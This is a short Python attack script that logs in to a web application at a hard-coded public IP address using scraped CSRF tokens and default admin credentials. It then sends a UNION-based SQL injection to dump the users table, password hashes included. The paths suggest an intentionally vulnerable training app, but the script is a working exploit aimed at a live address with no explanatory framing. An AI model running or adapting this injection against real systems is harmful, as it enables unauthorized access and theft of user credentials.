
import requests
import re

session = requests.Session()

# Get fresh token and login
resp = session.get("http://31.97.117.123/login.php")
match = re.search(r"user_token['\"] value=['\"](.*?)['\"]", resp.text)
token = match.group(1) if match else "574fcd28f93f57c93cb554ecaf3ca520"

# Login
login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token
}

resp = session.post("http://31.97.117.123/login.php", data=login_data)

# Test with simple ID first
resp = session.get("http://31.97.117.123/vulnerabilities/sqli/?id=1&Submit=Submit")
print("Response with id=1:")
print(resp.text[:1500])
print("\n\n" + "="*80 + "\n\n")

# Now try SQL injection to get users
resp = session.get("http://31.97.117.123/vulnerabilities/sqli/?id=1' UNION SELECT user_id, first_name, last_name, password FROM users-- -&Submit=Submit")
print("Response with SQL injection:")
print(resp.text)

